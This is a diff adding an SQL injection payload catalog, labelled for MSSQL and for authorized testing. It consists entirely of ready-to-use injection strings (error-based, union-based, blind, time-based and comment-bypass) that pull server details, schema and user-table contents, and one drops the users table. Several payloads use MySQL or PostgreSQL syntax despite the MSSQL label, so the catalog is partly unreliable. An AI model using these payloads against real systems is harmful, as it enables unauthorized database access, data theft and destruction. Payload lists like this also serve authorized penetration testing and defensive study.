@@ -1,0 +1,37 @@
+# SQL Injection Payload Catalog — MSSQL
+# Generated : 2026-02-20 18:30:04
+# Purpose   : Educational & authorized testing only
+
+
+## ERROR BASED
+1' AND CONVERT(int, @@version)--
+1' AND CONVERT(int, (SELECT @@servername))--
+1' AND CONVERT(int, (SELECT DB_NAME()))--
+1' AND CONVERT(int, (SELECT SUSER_NAME()))--
+1' AND 1=(CASE WHEN @@version LIKE '%2019%' THEN 1 ELSE (SELECT @@version) END)--
+
+## UNION BASED
+1' UNION SELECT @@servername, @@version, DB_NAME(), NULL--
+1' UNION SELECT TABLE_NAME, COLUMN_NAME, DATA_TYPE, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='dbo'--
+1' UNION SELECT name, NULL, NULL, NULL FROM sysobjects WHERE xtype='U'--
+1' UNION SELECT STRING_AGG(name, ', '), NULL, NULL, NULL FROM sys.tables--
+
+## BOOLEAN BLIND
+1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--
+1' AND (SELECT LENGTH(user())) > 5--
+1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%') > 0--
+1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 100 THEN 1 ELSE 0 END) = 1--
+
+## TIME BASED
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND IF((SELECT COUNT(*) FROM users) > 10, SLEEP(5), 0)--
+1' OR 1=1; WAITFOR DELAY '00:00:05'--
+1' AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+## COMMENT BYPASS
+1' OR '1'='1
+1' UNION SELECT NULL#
+1' UNION SELECT NULL,NULL/*
+1'; DROP TABLE users; --
+1' AND '1'='1' --
+1' OR '1'='1' /*
